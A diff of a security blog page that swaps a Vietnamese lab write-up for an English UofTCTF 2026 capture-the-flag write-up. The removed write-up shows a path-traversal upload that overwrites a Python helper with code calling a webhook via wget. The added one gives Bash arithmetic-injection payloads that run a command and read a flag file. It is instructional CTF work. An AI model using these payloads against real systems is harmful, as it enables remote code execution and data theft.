@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>
         
-        File Upload Challenge | Cuýt
+        Write-up: UofTCTF 2026 - challenge Lottery (Misc) | Cuýt
         
     </title>
     <link rel="stylesheet" href="/css/normalize.min.css">
@@ -22,8 +22,8 @@
     <link rel="preload" href="/fonts/JetBrainsMono/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin>
     <script src="/js/fuse.basic.min.js"></script>
     
-    <link rel="stylesheet" href="/css/style.min.9f32ab66b8df7dd8aa2d8ff501d516e1964d05571a88aad71c8ed047ea5d603e.css" integrity="sha256-nzKrZrjffdiqLY/1AdUW4ZZNBVcaiKrXHI7QR&#43;pdYD4="><meta name="description" content="Báo cáo Task 4.1: File upload Challenge lab whitebox http://113.171.248.61:8008/ Source code đính kèm
-Ta được cung cấp một source code Python, định nghĩa một …"></head>
+    <link rel="stylesheet" href="/css/style.min.28b461865e230e4f0484b49e667fd655132a5fd5225bc33379544a76d0292e6e.css" integrity="sha256-KLRhhl4jDk8EhLSeZn/WVRMqX9UiW8MzeVRKdtApLm4="><meta name="description" content="Description Han Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing.
+Now broke, his only hope is chance …"></head>
 <body>
     <main id="main" role="main">
         <header id="main-header">
@@ -86,12 +86,16 @@ Ta được cung cấp một source code Python, định nghĩa một …"></hea
                 
                 <div class="main-content__article-cover">
                     
+                        
+                        
+                        <img src="/2026/01/write-up-uoftctf-2026-challenge-lottery-misc/cover_hu_41e00969122b5419.webp" alt="Write-up: UofTCTF 2026 - challenge Lottery (Misc)">
+                    
                 </div>
             
         
             <header class="main-content__article-header">
                 <h1 class="main-content__article-title">
-                    File Upload Challenge
+                    Write-up: UofTCTF 2026 - challenge Lottery (Misc)
                 </h1>
                 <div class="main-content__article-meta mt-3">
                     <span>
@@ -99,18 +103,28 @@ Ta được cung cấp một source code Python, định nghĩa một …"></hea
                         
                             
                                 
+                                <a class="main-content__article-meta-category-link" href="/categories/writeups">
+                                    Writeups
+                                </a>
+                            
+                                , 
+                                <a class="main-content__article-meta-category-link" href="/categories/jail">
+                                    Jail
+                                </a>
+                            
+                                , 
+                                <a class="main-content__article-meta-category-link" href="/categories/misc">
+                                    Misc
+                                </a>
+                            
+                                , 
                                 <a class="main-content__article-meta-category-link" href="/categories/security">
                                     Security
                                 </a>
                             
-                                , 
-                                <a class="main-content__article-meta-category-link" href="/categories/file-uploads-vulnerabilities">
-                                    File uploads vulnerabilities
-                                </a>
-                            
                         
                     </span>
-                    <span class=""><i class="fa-regular fa-calendar"></i> 28/12/2025</span>
+                    <span class=""><i class="fa-regular fa-calendar"></i> 12/01/2026</span>
                     <span class=""><i class="fa-regular fa-clock"></i> 2 mins read</span>
                 </div>
             </header>
@@ -125,15 +139,14 @@ Ta được cung cấp một source code Python, định nghĩa một …"></hea
             
             
             <div class="main-content__article-body-content">
-                <h1 id="báo-cáo-task-41-file-upload">Báo cáo Task 4.1: File upload</h1>
-<h2 id="challenge-lab-whitebox">Challenge lab whitebox</h2>
-<blockquote>
-<p>http://113.171.248.61:8008/
-Source code đính kèm</p>
-</blockquote>
-<p>Ta được cung cấp một source code Python, định nghĩa một endpoint <code>/uploader</code> cho phép user upload thông qua method POST. Dựa vào những gì đề bài cho, ta chỉ có thể upload một file để tấn công</p>
-<h2 id="phân-tích-challenge">Phân tích challenge</h2>
-<p>Đáng chú ý nhất trong source code là đoạn này</p>
+                <h2 id="description">Description</h2>
+<p>Han Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing.<br>
+Now broke, his only hope is chance itself.</p>
+<p>Can you help Han Shangyan win the lottery?</p>
+<pre tabindex="0"><code>nc 35.245.30.212 5000
+</code></pre><p><strong>Author:</strong> SteakEnthusiast, White</p>
+<h2 id="source-analysis">Source Analysis</h2>
+<p>Inside the provided <code>lottery.zip</code>, we are given a <code>Dockerfile</code>, which shows that the challenge is deployed using the <code>pwn.red/jail</code> framework.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -147,66 +160,92 @@ Source code đính kèm</p>
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">helper</span>
-</span></span><span class="line"><span class="cl">    <span class="n">helper</span><span class="o">.</span><span class="n">rename_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;num_file&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;.txt&#39;</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Lỗi xử lý file: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="s">pwn.red/jail</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">COPY</span> --from<span class="o">=</span>ubuntu@sha256:c35e29c9450151419d9448b0fd75374fec4fff364a27f176fb458d472dfc9e54 / /srv<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> mkdir -p /srv/app<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/srv/app</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">COPY</span> --chmod<span class="o">=</span><span class="m">555</span> lottery.sh run<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">COPY</span> flag.txt /srv/flag.txt<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">ENV</span> <span class="nv">JAIL_PIDS</span><span class="o">=</span><span class="m">10</span> <span class="nv">JAIL_MEM</span><span class="o">=</span>10M <span class="nv">JAIL_TIME</span><span class="o">=</span><span class="m">120</span> <span class="nv">JAIL_POW</span><span class="o">=</span><span class="m">10000</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Trong đó sử dụng <code>os.path.join()</code>, developer đã truyền trực tiếp <code>f.filename</code> của người dùng vào thẳng <code>UPLOAD_FOLDER</code>. Từ đây, ta biết chắc chắn có thể tấn công Path Traversal. Chỉ bằng cách thay đổi tên của <code>f.filename</code></p>
-<p>Ngoài ra, trong challenge này, có lẽ hàm <code>f.save()</code> mặc định sẽ replace file đang có bằng file mới cùng tên (file của attacker gửi lên).</p>
-<p>Khi đọc kĩ source, ta sẽ thấy developer có viết thêm một file tên là <code>helper.py</code> trong thư mục <code>../utils</code>, trong file này có hàm <code>rename_file</code>. Giờ ta sẽ viết lại file <code>helper.py</code> để ghi đè hàm <code>rename_file</code> gọi về webhook của ta</p>
-<h2 id="tấn-công-thử">Tấn công thử</h2>
-<p>Kết hợp Path Traversal và File Upload theo như phân tích ta đã biết ở trên kia, dưới đây là Request gửi từ Burp Suite</p>
-<pre tabindex="0"><code>POST /uploader HTTP/1.1
-Host: 113.171.248.61:8008
-Content-Length: 622
-Cache-Control: max-age=0
-Accept-Language: en-US,en;q=0.9
-Upgrade-Insecure-Requests: 1
-Origin: http://113.171.248.61:8008
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykggKjwOlZ9TcAUwi
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://113.171.248.61:8008/
-Accept-Encoding: gzip, deflate, br
-Cookie: session=eyJudW1fZmlsZSI6MX0.aCQ98Q.3YlntWqlPEEqwf5vIut5BBSCAts
-Connection: keep-alive
-
-------WebKitFormBoundarykggKjwOlZ9TcAUwi
-Content-Disposition: form-data; name=&#34;files&#34;; filename=&#34;../utils/helper.py&#34;
-Content-Type: text/plain
-
-import os
-
-def rename_file(a, b):
-    try:
-        # Try wget as an alternative to curl
-        os.system(&#34;wget -qO- https://webhook.site/a4a258a3-5789-48a7-a1b3-64a1b4e78ab9&#34;)
-        # Try using ping as a fallback method to trigger the webhook
-        os.system(&#34;ping -c 1 webhook.site&#34;)
-        print(&#34;Webhook attempt made via wget and ping&#34;)
-    except Exception as e:
-        print(f&#34;Error calling webhook: {e}&#34;)
-
-------WebKitFormBoundarykggKjwOlZ9TcAUwi--
-</code></pre><p>với header dưới đây để ghi đè file <code>helper.py</code> sử dụng Path Traversal.</p>
-<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;files&#34;; filename=&#34;../utils/helper.py&#34;
-</code></pre><p>Và khi thử lại với webhook, ta thấy đã thành công gửi request về webhook của ta
-
+</div><p>The challenge is <strong>white-boxed</strong>. The following Bash script contains the core logic.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Today&#39;s lottery!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Guess the winning ticket (hex):&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> guess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$guess</span><span class="s2">&#34;</span> <span class="o">=</span>~ ^<span class="o">[</span>0-9a-fA-F<span class="o">]</span>+ <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">let</span> <span class="s2">&#34;g = 0x</span><span class="nv">$guess</span><span class="s2">&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid guess.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">ticket</span><span class="o">=</span><span class="k">$(</span>head -c <span class="m">16</span> /dev/urandom <span class="p">|</span> md5sum <span class="p">|</span> cut -c1-16<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">let</span> <span class="s2">&#34;t = 0x</span><span class="nv">$ticket</span><span class="s2">&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$g</span> -eq <span class="nv">$t</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    cat /flag.txt
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Not a winner. Better luck next time!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="solution">Solution</h2>
+<h3 id="breaking-the-random-ticket">Breaking the Random Ticket</h3>
+<p>The ticket generation relies on external commands (<code>head</code>, <code>md5sum</code>, and <code>cut</code>), which are resolved through the <code>PATH</code> environment variable.</p>
+<p>Because our input is injected into a Bash arithmetic expression using <code>let</code>, we can abuse the comma operator to perform variable assignments.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>0,PATH=0
+</code></pre><p>This causes:</p>
+<ul>
+<li><code>PATH</code> to be overwritten,</li>
+<li>the random ticket generation pipeline to fail,</li>
+<li><code>ticket</code> to become an empty string,</li>
+<li>and <code>t</code> to evaluate to <code>0</code>.</li>
+</ul>
+<p>This allows us to reach the winning branch; however, <code>cat</code> also breaks because it depends on <code>PATH</code>.</p>
+<p>
+  
   
 <figure class="image-container">
-  <a href="https://hackmd.io/_uploads/HJKZXTWbxe.png" 
+  <a href="/2026/01/write-up-uoftctf-2026-challenge-lottery-misc/image.png" 
      class="lightbox-trigger" 
      >
-      <img src="https://hackmd.io/_uploads/HJKZXTWbxe.png" 
+      <img src="/2026/01/write-up-uoftctf-2026-challenge-lottery-misc/image_hu_ae044c883d2e2b6b.webp" 
            
-           alt="image" 
+             width="954" height="430"
+           
+           alt="" 
            class="main-content__article-body-img" 
            loading="lazy" 
       />
@@ -214,12 +253,43 @@ def rename_file(a, b):
   
   
 </figure></p>
-<h2 id="tổng-kết">Tổng kết</h2>
-<p>Vậy khi đã có thể call tới webhook rồi, ta cũng có thể RCE, leo quyền hệ thống, &hellip;</p>
-<p>Để ngăn chặn lỗ hổng này, ta có thể áp dụng: check tên file, loại file, chỉ định thư mục upload cụ thể, container hoá app, v.v&hellip;</p>
-<h2 id="tham-khảo">Tham khảo</h2>
-<p><a href="https://samy.blog/rtfm/">https://samy.blog/rtfm/</a></p>
-
+<h3 id="bash-arithmetic-injection">Bash Arithmetic Injection</h3>
+<p>While researching Bash arithmetic behavior, a similar vulnerability was found in <strong>JSON Bourne (PlaidCTF 2020)</strong>.</p>
+<p>Key insight:</p>
+<blockquote>
+<p>Array indexing inside Bash arithmetic expressions triggers full expansion, including command substitution.</p>
+</blockquote>
+<p>Example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="s1">&#39;__[$(id)]&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">y</span><span class="o">=</span><span class="k">$((</span><span class="m">1</span><span class="o">+</span>x<span class="k">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="final-exploit">Final Exploit</h3>
+<p>The final payload leverages array indexing to trigger command execution and redirects the flag output directly to the main process stdout.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">0</span> + a<span class="o">[</span><span class="k">$(</span>cat /flag.txt &gt; /proc/1/fd/1<span class="k">)</span><span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Explanation:</p>
+<ul>
+<li><code>a[INDEX]</code> forces Bash to fully expand <code>INDEX</code>,</li>
+<li><code>$()</code> inside <code>INDEX</code> is executed,</li>
+<li>output is redirected to <code>/proc/1/fd/1</code>, which corresponds to stdout of PID 1,</li>
+<li>PID 1 holds the socket connected to <code>nc</code>, so the flag is sent directly to the client.</li>
+</ul>
+<h3 id="flag">Flag</h3>
+<pre tabindex="0"><code>uoftctf{you_won_the_LETtery_(hahahaha_get_it???)}
+</code></pre>
             </div>
         
             <div class="article-footer mt-5 pt-4" style="font-size: smaller;">
@@ -237,14 +307,14 @@ def rename_file(a, b):
                 <ul class="main-content__article-panel-list">
                     
                         <li class="main-content__article-panel-item">
-                            <a class="main-content__article-panel-item-link" href="/2026/01/write-up-uoftctf-2026-challenge-lottery-misc/" title="Write-up: UofTCTF 2026 - challenge Lottery (Misc)">
-                                <span class="main-content__article-panel-item-text">Write-up: UofTCTF 2026 - challenge Lottery (Misc)</span>
+                            <a class="main-content__article-panel-item-link" href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/" title="Writeup (Web) Cybersecurity Student Contest Vietnam 2025">
+                                <span class="main-content__article-panel-item-text">Writeup (Web) Cybersecurity Student Contest Vietnam 2025</span>
                             </a>
                         </li>
                     
                         <li class="main-content__article-panel-item">
-                            <a class="main-content__article-panel-item-link" href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/" title="Writeup (Web) Cybersecurity Student Contest Vietnam 2025">
-                                <span class="main-content__article-panel-item-text">Writeup (Web) Cybersecurity Student Contest Vietnam 2025</span>
+                            <a class="main-content__article-panel-item-link" href="/2025/12/file-upload-challenge/" title="File Upload Challenge">
+                                <span class="main-content__article-panel-item-text">File Upload Challenge</span>
                             </a>
                         </li>
                     
@@ -330,11 +400,16 @@ def rename_file(a, b):
                     </h3>
                     <nav id="TableOfContents">
   <ul>
-    <li><a href="#challenge-lab-whitebox">Challenge lab whitebox</a></li>
-    <li><a href="#phân-tích-challenge">Phân tích challenge</a></li>
-    <li><a href="#tấn-công-thử">Tấn công thử</a></li>
-    <li><a href="#tổng-kết">Tổng kết</a></li>
-    <li><a href="#tham-khảo">Tham khảo</a></li>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#source-analysis">Source Analysis</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#breaking-the-random-ticket">Breaking the Random Ticket</a></li>
+        <li><a href="#bash-arithmetic-injection">Bash Arithmetic Injection</a></li>
+        <li><a href="#final-exploit">Final Exploit</a></li>
+        <li><a href="#flag">Flag</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
                 </div>
